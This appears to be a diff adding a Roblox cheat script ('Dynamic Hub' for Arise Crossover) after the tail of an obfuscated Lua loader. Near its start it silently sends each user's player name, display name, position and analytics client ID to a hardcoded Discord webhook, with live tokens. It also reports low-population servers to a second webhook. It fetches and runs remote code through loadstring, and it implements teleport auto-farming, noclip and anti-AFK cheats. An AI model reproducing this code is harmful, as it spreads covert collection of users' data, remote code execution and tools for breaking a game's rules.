f,o;c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];f=t[e]c[f](s(c,f+1,t[n]))r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];f=t[e];o=c[t[n]];c[f+1]=o;c[f]=o[t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c[t[e]]={};r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];f=t[e]c[f]=c[f]()end else local f;c[t[e]]=h[t[n]];r=r+1;t=d[r];f=t[e]c[f]=c[f]()r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];f=t[e]c[f](c[f+1])r=r+1;t=d[r];do return end;end end end end end end end end r=1+r;end;end;return lv end;local e=0xff;local h={};local l=(1);local n='';(function(r)local c=r local d=0x00 local t=0x00 c={(function(f)if d>0x26 then return f end d=d+1 t=(t+0x1134-f)%0x2a return(t%0x03==0x0 and(function(c)if not r[c]then t=t+0x01 r[c]=(0xc7);h[l]=fv();l=l+e;end return true end)'JFYwn'and c[0x3](0x354+f))or(t%0x03==0x2 and(function(c)if not r[c]then t=t+0x01 r[c]=(0x28);end return true end)'xzyam'and c[0x2](f+0x38f))or(t%0x03==0x1 and(function(c)if not r[c]then t=t+0x01 r[c]=(0xae);e[2]=(e[2]*(lv(function()h()end,s(n))-lv(e[1],s(n))))+1;h[l]={};e=e[2];l=l+e;end return true end)'ibMZX'and c[0x1](f+0x255))or f end),(function(f)if d>0x27 then return f end d=d+1 t=(t+0x885-f)%0xa return(t%0x03==0x1 and(function(c)if not r[c]then t=t+0x01 r[c]=(0x5e);end return true end)'sGoTF'and c[0x3](0xa2+f))or(t%0x03==0x0 and(function(c)if not r[c]then t=t+0x01 r[c]=(0xb1);end return true end)'ODZGz'and c[0x2](f+0x23b))or(t%0x03==0x2 and(function(c)if not r[c]then t=t+0x01 r[c]=(0x84);n={n..'\58 a',n};h[l]=nv();l=l+((not u.ePfTkBLr)and 1 or 0);n[1]='\58'..n[1];e[2]=0xff;end return true end)'kijWW'and c[0x1](f+0x363))or f end),(function(l)if d>0x20 then return l end d=d+1 t=(t+0xeea-l)%0x23 return(t%0x03==0x0 and(function(c)if not r[c]then t=t+0x01 r[c]=(0x15);end return true end)'VjX_v'and c[0x1](0x24d+l))or(t%0x03==0x1 and(function(c)if not r[c]then t=t+0x01 r[c]=(0x3d);n='\37';e={function()e()end};n=n..'\100\43';end return true end)'dFxgh'and c[0x2](l+0x254))or(t%0x03==0x2 and(function(c)if not r[c]then t=t+0x01 r[c]=(0xf5);end return true end)'lFrOM'and c[0x3](l+0xf6))or l end)}c[0x3](0x11d3)end){};local t=j(s(h));return t(...);end return dv((function()local r={}local t=0x01;local c;if u.ePfTkBLr then c=u.ePfTkBLr(dv)else c=''end if u.EHZJwPJy(c,u.VFmuxpKB)then t=t+0;else t=t+1;end r[t]=0x02;r[r[t]+0x01]=0x03;return r;end)(),...)end)((function(c,t,r,e,n,d)local d;if 4<=c then if 6>c then if c~=4 then local c=e;do return function()local t=t(r,c(c,c),c(c,c));c(1);return t;end;end;else local c=e;local n,e,l=n(2);do return function()local f,r,d,t=t(r,c(c,c),c(c,c)+3);c(4);return(t*n)+(d*e)+(r*l)+f;end;end;end else if c>6 then if 4~=c then for t=11,89 do if c<8 then do return setmetatable({},{['__\99\97\108\108']=function(t,e,c,n,r)if r then return t[r]elseif n then return t else t[e]=c end end})end break;end;do return r(c,nil,r);end break;end;else do return r(c,nil,r);end end else do return n[r]end;end end else if 1<c then if 2~=c then do return t(1),t(4,n,e,r,t),t(5,n,e,r)end;else do return 16777216,65536,256 end;end else if-4<=c then repeat if 1>c then do return t(1),t(4,n,e,r,t),t(5,n,e,r)end;break;end;do return function(r,t,c)if c then local t=(r/2^(t-1))%2^((c-1)-(t-1)+1);return t-t%1;else local t=2^(t-1);return(r%(t+t)>=t)and 1 or 0;end;end;end;until true;else do return t(1),t(4,n,e,r,t),t(5,n,e,r)end;end end end end),...)
+local executor = identifyexecutor()
+-- PC
+if executor == "Wave" or executor == "AWP" or executor == "Synapse Z" or executor == "Seriality" or executor == "Argon" or executor == "Atlantis" or executor == "Xeno" or executor == "Solara" or executor == "Velocity" or executor == "Seliware" or executor == "Swift"
+-- Mobile
+or executor == "Fluxus" or executor == "Delta" or executor == "Arceus X" or executor == "Codex" or executor == "Cryptic" or executor == "Krnl"
+then
+print("Executor " .. identifyexecutor())
+local webh =
+"https://discord.com/api/webhooks/1348009134783463434/RqQiEwiBU8IFkwrA6QijKFIOIHkV3YCK7AkyCLxu7G2ArT6r_CxsrxLVsnCSvt6E5O5t"
+local executor = identifyexecutor()
+local placeId = game.PlaceId
+local mapName = game:GetService("MarketplaceService"):GetProductInfo(placeId)
+local currentTime = os.date("%Y-%m-%d %H:%M:%S")
+local player = game.Players.LocalPlayer
+local playerName = player.Name
+local playerDisplayName = player.DisplayName
+local playerPosition = player.Character and player.Character.HumanoidRootPart.Position or "Unknown"
+local clientId = game:GetService('RbxAnalyticsService'):GetClientId()
+
+pcall(function()
+    local data = {
+        ["embeds"] = {
+            {
+                ["title"] = "Game Information",
+                ["description"] = string.format([[
+Executor: %s
+Map: %s
+Time: %s
+Player Name: %s
+Display Name: %s
+Player Position: %s
+Client ID: %s
+]], executor, mapName.Name, currentTime, playerName, playerDisplayName, tostring(playerPosition), clientId),
+                ["color"] = tonumber(0x7269da)
+            }
+        }
+    }
+    local httpService = game:GetService('HttpService')
+    local response
+    if syn then
+        response = syn.request({
+            Url = webh,
+            Method = 'POST',
+            Headers = {
+                ['Content-Type'] = 'application/json'
+            },
+            Body = httpService:JSONEncode(data),
+        })
+    elseif request then
+        response = request({
+            Url = webh,
+            Method = 'POST',
+            Headers = {
+                ['Content-Type'] = 'application/json'
+            },
+            Body = httpService:JSONEncode(data),
+        })
+    elseif http_request then
+        response = http_request({
+            Url = webh,
+            Method = 'POST',
+            Headers = {
+                ['Content-Type'] = 'application/json'
+            },
+            Body = httpService:JSONEncode(data),
+        })
+    end
+end)
+
+local webh =
+"https://discord.com/api/webhooks/1348879379186585710/HL6nj5UQrxSgDUzsgWHWhoGUbZCdb5Oj7dMZvrhI8XuBUY53-ImRh9LSylqR_zA7QZT6"
+local httpService = game:GetService('HttpService')
+local marketplaceService = game:GetService("MarketplaceService")
+local notified = false
+task.spawn(function()
+    while true do
+        if game.PrivateServerId == nil or game.PrivateServerId == "" then
+            local playerCount = #game.Players:GetPlayers()
+            if playerCount < 5 and not notified then
+                local jobId = game.JobId
+                local success, serverTime = pcall(function()
+                    return game:GetService("Lighting"):GetMinutesAfterMidnight()
+                end)
+                local hours, minutes = 0, 0
+                if success then
+                    hours = math.floor(serverTime / 60)
+                    minutes = math.floor(serverTime % 60)
+                else
+                end
+                local formattedTime = string.format("%02d:%02d", hours, minutes)
+                local placeId = game.PlaceId
+                local placeInfo = { Name = "Unknown" }
+                local success, info = pcall(function()
+                    return marketplaceService:GetProductInfo(placeId)
+                end)
+                if success then
+                    placeInfo = info
+                else
+                end
+                local data = {
+                    ["embeds"] = {
+                        {
+                            ["title"] = "Low Server",
+                            ["fields"] = {
+                                { ["name"] = "Players :",     ["value"] = string.format("```yaml\n%d/12\n```", playerCount),                                                                            ["inline"] = false },
+                                { ["name"] = "Server Time :", ["value"] = string.format("```fix\n%s\n```", formattedTime),                                                                              ["inline"] = false },
+                                { ["name"] = "Job-Id :",      ["value"] = string.format("```yaml\n%s\n```", jobId),                                                                                     ["inline"] = false },
+                                { ["name"] = "game Name :",   ["value"] = string.format("```yaml\n%s\n```", placeInfo.Name),                                                                            ["inline"] = false },
+                                { ["name"] = "Script :",      ["value"] = string.format("```lua\ngame:GetService(\"ReplicatedStorage\").__ServerBrowser:InvokeServer(\"teleport\", \"%s\")```", jobId), ["inline"] = false }
+                            },
+                            ["color"] = 0xFF0000
+                        }
+                    }
+                }
+                local success, response = pcall(function()
+                    if syn then
+                        return syn.request({
+                            Url = webh,
+                            Method = 'POST',
+                            Headers = { ['Content-Type'] = 'application/json' },
+                            Body = httpService:JSONEncode(data),
+                        })
+                    elseif request then
+                        return request({
+                            Url = webh,
+                            Method = 'POST',
+                            Headers = { ['Content-Type'] = 'application/json' },
+                            Body = httpService:JSONEncode(data),
+                        })
+                    elseif http_request then
+                        return http_request({
+                            Url = webh,
+                            Method = 'POST',
+                            Headers = { ['Content-Type'] = 'application/json' },
+                            Body = httpService:JSONEncode(data),
+                        })
+                    else
+                        return nil
+                    end
+                end)
+                if success and response and response.StatusCode == 200 then
+                    notified = true
+                else
+                end
+            elseif playerCount >= 5 then
+                if notified then
+                end
+                notified = false
+            end
+        else
+        end
+        task.wait(21600)
+    end
+end)
+if not game:IsLoaded() then repeat game.Loaded:Wait() until game:IsLoaded() end
+getgenv().Config = {
+    Save_Member = true
+}
+_G.Check_Save_Setting = "CheckSaveSetting"
+getgenv()['JsonEncode'] = function(msg)
+    return game:GetService("HttpService"):JSONEncode(msg)
+end
+getgenv()['JsonDecode'] = function(msg)
+    return game:GetService("HttpService"):JSONDecode(msg)
+end
+getgenv()['Check_Setting'] = function(Name)
+    if not _G.Dis and not isfolder('Dynamic Hub Arise Crossover') then
+        makefolder('Dynamic Hub Arise Crossover')
+    end
+    if not _G.Dis and not isfile('Dynamic Hub Arise Crossover/' .. Name .. '.json') then
+        writefile('Dynamic Hub Arise Crossover/' .. Name .. '.json', JsonEncode(getgenv().Config))
+    end
+end
+getgenv()['Get_Setting'] = function(Name)
+    if not _G.Dis and isfolder('Dynamic Hub Arise Crossover') and isfile('Dynamic Hub Arise Crossover/' .. Name .. '.json') then
+        getgenv().Config = JsonDecode(readfile('Dynamic Hub Arise Crossover/' .. Name .. '.json'))
+        return getgenv().Config
+    elseif not _G.Dis then
+        Check_Setting(Name)
+    end
+end
+getgenv()['Update_Setting'] = function(Name)
+    if not _G.Dis and isfolder('Dynamic Hub Arise Crossover') and isfile('Dynamic Hub Arise Crossover/' .. Name .. '.json') then
+        writefile('Dynamic Hub Arise Crossover/' .. Name .. '.json', JsonEncode(getgenv().Config))
+    elseif not _G.Dis then
+        Check_Setting(Name)
+    end
+end
+Check_Setting(_G.Check_Save_Setting)
+Get_Setting(_G.Check_Save_Setting)
+if getgenv().Config.Save_Member then
+    getgenv()['MyName'] = game.Players.LocalPlayer.Name
+elseif getgenv().Config.Save_All_Member then
+    getgenv()['MyName'] = "AllMember"
+else
+    getgenv()['MyName'] = "None"
+    _G.Dis = true
+end
+Check_Setting(getgenv()['MyName'])
+Get_Setting(getgenv()['MyName'])
+getgenv().Config.Key = _G.wl_key
+Update_Setting(getgenv()['MyName'])
+local Fluent = loadstring(game:HttpGet("https://raw.githubusercontent.com/tun9811/Fluent/refs/heads/main/main.lua"))()
+local SaveManager = loadstring(game:HttpGet(
+    "https://raw.githubusercontent.com/tun9811/Fluent/refs/heads/main/SaveManager.lua"))()
+local InterfaceManager = loadstring(game:HttpGet(
+    "https://raw.githubusercontent.com/tun9811/Fluent/refs/heads/main/InterfaceManager.lua"))()
+--// Anti AFK
+game:GetService("Players").LocalPlayer.Idled:connect(function()
+    game:GetService("VirtualUser"):Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
+    wait(180)
+    game:GetService("VirtualUser"):Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
+end)
+--[[]
+local L_3c2 = 200
+function TP(Pos)
+local Distance = (Pos.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
+if Distance <= 100 then
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Pos
+end
+if Distance < 80 then
+Speed11 = 275
+elseif Distance < 120 then
+Speed11 = 300
+elseif Distance < 150 then
+Speed11 = 800
+elseif Distance < 230 then
+Speed11 = 740
+elseif Distance < 330 then
+Speed11 = 640
+elseif Distance < 440 then
+Speed11 = 520
+elseif Distance < 580 then
+Speed11 = 410
+elseif Distance < 700 then
+Speed11 = 350
+elseif Distance < 800 then
+Speed11 = 300
+elseif Distance < 900 then
+Speed11 = 275
+elseif Distance >= 1000 then
+Speed11 = 275
+end
+local tweenInfo = TweenInfo.new(Distance / getgenv().Config["Tween Speed"], Enum.EasingStyle.Linear)
+local tween = game:GetService("TweenService"):Create(game.Players.LocalPlayer.Character.HumanoidRootPart,
+tweenInfo, {
+CFrame = Pos
+})
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.X, Pos.Y,
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Z)
+if BypassTP and Distance >= 0 then
+game.Players.LocalPlayer.Character.Humanoid:ChangeState(15)
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Pos
+task.wait()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Pos
+game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
+end
+tween:Play()
+end
+function TP(Pos)
+    local Distance = (Pos.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
+    local tweenInfo = TweenInfo.new(Distance / getgenv().Config["Tween Speed"], Enum.EasingStyle.Linear)
+    local tween = game:GetService("TweenService"):Create(game.Players.LocalPlayer.Character.HumanoidRootPart,
+        tweenInfo, {
+            CFrame = Pos
+        })
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.X, Pos.Y,
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Z)
+    if BypassTP and Distance >= 1000 then
+        game.Players.LocalPlayer.Character.Humanoid:ChangeState(15)
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Pos
+        task.wait()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Pos
+        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
+    end
+    tween:Play()
+end
+--]]
+function TP(Pos)
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =  Pos
+end
+function StopTween(target)
+    if not target then
+        _G.StopTween = true
+        wait()
+        TP(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame)
+        wait()
+        local humanoidRootPart = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
+        if humanoidRootPart:FindFirstChild("BodyClip") then
+            humanoidRootPart:FindFirstChild("BodyClip"):Destroy()
+        end
+        _G.StopTween = false
+        _G.Clip = false
+        local character = game.Players.LocalPlayer.Character
+        if character:FindFirstChild("Highlight") then
+            character:FindFirstChild("Highlight"):Destroy()
+        end
+    end
+end
+function Rejoin()
+    local TeleportService = game:GetService("TeleportService")
+    local player = game.Players.LocalPlayer
+    if player then
+        pcall(function()
+            TeleportService:Teleport(game.PlaceId, player)
+        end)
+    end
+end
+local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local function isAutoEnabled()
+    local keys_G = {
+        "Auto Farm", "Auto Farm [ Nearest ]", "Auto Farm Bosses", "Auto Farm Dungeon",
+        "Auto Farm Rank", "Auto Farm lnfernal Castle"
+    }
+    for _, key in ipairs(keys_G) do
+        if getgenv().Config[key] then return true end
+    end
+    return false
+end
+spawn(function()
+    while wait() do
+        if isAutoEnabled() then
+            local hrp = Players.LocalPlayer.Character.HumanoidRootPart
+            if not hrp:FindFirstChild("BodyClip") then
+                local Noclip = Instance.new("BodyVelocity")
+                Noclip.Name = "BodyClip"
+                Noclip.Parent = hrp
+                Noclip.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+                Noclip.Velocity = Vector3.new(0, 0, 0)
+            end
+        end
+    end
+end)
+RunService.Stepped:Connect(function()
+    if isAutoEnabled() then
+        for _, v in pairs(Players.LocalPlayer.Character:GetDescendants()) do
+            if v:IsA("BasePart") then
+                v.CanCollide = false
+            end
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if isAutoEnabled() then
+            if not Players.LocalPlayer.Character:FindFirstChild("Highlight") then
+                local Highlight = Instance.new("Highlight")
+                Highlight.FillColor = Color3.fromRGB(81, 255, 60)
+                Highlight.OutlineColor = Color3.fromRGB(81, 255, 60)
+                Highlight.Parent = Players.LocalPlayer.Character
+            end
+        end
+    end
+end)
+local TweenService = game:GetService("TweenService")
+_G.Logo = 83452741766028 --- เลข logo
+if game.CoreGui:FindFirstChild("ImageButton") then
+    game.CoreGui:FindFirstChild("ImageButton"):Destroy()
+end
+local TweenService = game:GetService("TweenService")
+_G.Logo = 83452741766028 --- เลข logo
+if game.CoreGui:FindFirstChild("ImageButton") then
+    game.CoreGui:FindFirstChild("ImageButton"):Destroy()
+end
+local ScreenGui = Instance.new("ScreenGui")
+local ImageButton = Instance.new("ImageButton")
+local UICorner = Instance.new("UICorner")
+local UIStroke = Instance.new("UIStroke")
+local Shadow = Instance.new("ImageLabel")
+local ClickSound = Instance.new("Sound")
+ScreenGui.Name = "ImageButton"
+ScreenGui.Parent = game.CoreGui
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ImageButton.Parent = ScreenGui
+ImageButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+ImageButton.BackgroundTransparency = 0.8
+ImageButton.BorderSizePixel = 0
+ImageButton.Position = UDim2.new(0.49, 0, 0.010, 0)
+ImageButton.Size = UDim2.new(0, 50, 0, 45)
+ImageButton.Draggable = false
+ImageButton.Image = "http://www.roblox.com/asset/?id=" .. (_G.Logo)
+ImageButton.ImageTransparency = 0.4
+UICorner.CornerRadius = UDim.new(0, 10)
+UICorner.Parent = ImageButton
+UIStroke.Parent = ImageButton
+UIStroke.Thickness = 2
+UIStroke.Color = Color3.fromRGB(255, 255, 255)
+UIStroke.Transparency = 1
+ClickSound.Parent = ImageButton
+ClickSound.SoundId = "rbxassetid://130785805"
+ClickSound.Volume = 1
+local function playClickAnimation()
+    local originalSize = ImageButton.Size
+    local TweenSizeUp = TweenService:Create(ImageButton, TweenInfo.new(0.1), { Size = UDim2.new(0, 50, 0, 45) })
+    local TweenSizeDown = TweenService:Create(ImageButton, TweenInfo.new(0.1), { Size = originalSize })
+    TweenSizeUp:Play()
+    TweenSizeUp.Completed:Connect(function()
+        TweenSizeDown:Play()
+    end)
+end
+ImageButton.MouseButton1Down:Connect(function()
+    ClickSound:Play()
+    playClickAnimation()
+    game:GetService("VirtualInputManager"):SendKeyEvent(true, "RightControl", false, game)
+    game:GetService("VirtualInputManager"):SendKeyEvent(false, "RightControl", false, game)
+end)
+local Window = Fluent:CreateWindow({
+    Title = "Arise Crossover - Dynamic Hub",
+    SubTitle = "By x2Livex",
+    TabWidth = 110,
+    Size = UDim2.fromOffset(620, 420),
+    --[[
+Acrylic = true,
+--]]
+    Theme = "Lua Theme",
+    MinimizeKey = Enum.KeyCode.RightControl
+})
+local Tabs = {
+    AutoFarm = Window:AddTab({ Title = "Auto Farm", Icon = "swords" }),
+    Dungeons = Window:AddTab({ Title = "Dungeons", Icon = "shield" }),
+    Teleport = Window:AddTab({ Title = "Teleport", Icon = "map-pin" }),
+    Shop = Window:AddTab({ Title = "Shop", Icon = "shopping-cart" }),
+    Miscellaneous = Window:AddTab({ Title = "Miscellaneous", Icon = "fingerprint" }),
+    Settings = Window:AddTab({ Title = "Settings", Icon = "settings" })
+}
+local Options = Fluent.Options
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local TweenService = game:GetService("TweenService")
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local humanoidRootPart = Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")
+Tabs.AutoFarm:AddSection("Farm Monster")
+local Mob = {
+    "Vermillion",
+    "LongIn",
+    "Anders",
+    "Eminel",
+    "Gonshee",
+    "Monarch",
+    "Largalgan",
+    "Blossom",
+    "Michille",
+    "Genji",
+    "Fyakuya",
+    "Wind",
+    "Red Ant",
+    "Royal Red Ant",
+    "Snake Man",
+    "Shark Man",
+    "Black Crow",
+    "Daek",
+    "Light Admiral",
+    "Soondoo",
+    "Sortudo",
+    "Ant Queen",
+    "Luryu",
+    "Diablo",
+    "Gosuke",
+    "Golyne",
+    "Heaven",
+    "Ika",
+    "Zere",
+}
+local ChoosedMob = Tabs.AutoFarm:AddDropdown("Select Monster", {
+    Title = "Select Monster",
+    Description = "",
+    Values = Mob,
+    Multi = false,
+    Default = getgenv().Config["Select Monster"] or "N/A",
+})
+ChoosedMob:OnChanged(function(Value)
+    _G['Select Monster'] = Value
+    getgenv().Config["Select Monster"] = Value
+    Update_Setting(getgenv()['MyName'])
+end)
+Tabs.AutoFarm:AddToggle("Auto Farm", {
+    Title = "Auto Farm",
+    Description = "",
+    Default = getgenv().Config["Auto Farm"] or false,
+    Callback = function(Value)
+        getgenv().Config["Auto Farm"] = Value
+        Update_Setting(getgenv()['MyName'])
+        StopTween(getgenv().Config["Auto Farm"])
+    end
+})
+local pos = CFrame.new(0, 0, -3)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm"] and _G['Select Monster'] == "LongIn" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(127.044884, 28.2794838, -157.648727, 0.98774296, 6.44023373e-07, -0.15608938,
+                            -5.63040089e-07, 1, 5.63039805e-07, 0.15608938, -4.68254029e-07, 0.98774296))
+                        if checkmon == "LongIn" then
+                            if v.HumanoidRootPart.Size == Vector3.new(2, 2, 1) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm"] or _G['Select Monster'] ~= "LongIn" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm"] and _G['Select Monster'] == "Anders" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(-463.020905, 28.2794552, -411.290924, -0.999969184, 2.94956124e-07,
+                            -0.0078479629, 2.9266829e-07, 1, 2.92667892e-07, 0.0078479629, 2.9036201e-07,
+                            -0.999969184))
+                        if checkmon == "Anders" then
+                            if v.HumanoidRootPart.Size == Vector3.new(2, 2, 1) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm"] or _G['Select Monster'] ~= "Anders" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm"] and _G['Select Monster'] == "Eminel" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(-3224.47168, 57.1272964, -2113.38647, -0.934378147, 3.35049833e-07, -0.35628286,
+                            2.59595538e-07, 1, 2.59595481e-07, 0.35628286, 1.50070889e-07, -0.934378147))
+                        if checkmon == "Eminel" then
+                            if v.HumanoidRootPart.Size == Vector3.new(2, 2, 1) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm"] or _G['Select Monster'] ~= "Eminel" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm"] and _G['Select Monster'] == "Gonshee" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(593.034058, 28.6965714, -263.430786, 0.870460749, -9.81849766e-08, 0.492237836,
+                            2.59595481e-07, 1, -2.59595424e-07, -0.492237836, 3.53750352e-07, 0.870460749))
+                        if checkmon == "Gonshee" then
+                            if v.HumanoidRootPart.Size == Vector3.new(2, 2, 1) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm"] or _G['Select Monster'] ~= "Gonshee" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm"] and _G['Select Monster'] == "Largalgan" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(-200.753998, 124.33831, -393.0047, 0.801707506, 1.63761307e-08, 0.59771657,
+                            -3.80919545e-08, 1, 2.36942999e-08, -0.59771657, -4.17640891e-08, 0.801707506))
+                        if checkmon == "Largalgan" then
+                            if v.HumanoidRootPart.Size == Vector3.new(2, 2, 1) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm"] or _G['Select Monster'] ~= "Largalgan" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm"] and _G['Select Monster'] == "Blossom" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(-3369.73804, 29.8264046, 2656.87427, -0.507923067, -1.99022992e-07,
+                            -0.861402452, 5.63039634e-07, 1, -5.63039748e-07, 0.861402452, -7.70984627e-07,
+                            -0.507923067))
+                        if checkmon == "Blossom" then
+                            if v.HumanoidRootPart.Size == Vector3.new(2, 2, 1) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm"] or _G['Select Monster'] ~= "Blossom" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm"] and _G['Select Monster'] == "Michille" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(114.857445, 38.3894615, 4748.9043, -0.989949822, 2.93698122e-07, 0.141418859,
+                            2.59595424e-07, 1, -2.59595254e-07, -0.141418859, -2.20274586e-07, -0.989949822))
+                        if checkmon == "Michille" then
+                            if v.HumanoidRootPart.Size == Vector3.new(2, 2, 1) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm"] or _G['Select Monster'] ~= "Michille" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm"] and _G['Select Monster'] == "Genji" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(3039.5625, 46.4275284, -3562.73877, 0.991612613, 2.90969609e-07, 0.129245594,
+                            -2.59595367e-07, 1, -2.59595424e-07, -0.129245594, 2.2386655e-07, 0.991612613))
+                        if checkmon == "Genji" then
+                            if v.HumanoidRootPart.Size == Vector3.new(2, 2, 1) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm"] or _G['Select Monster'] ~= "Genji" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm"] and _G['Select Monster'] == "Fyakuya" then
+            pcall(function()
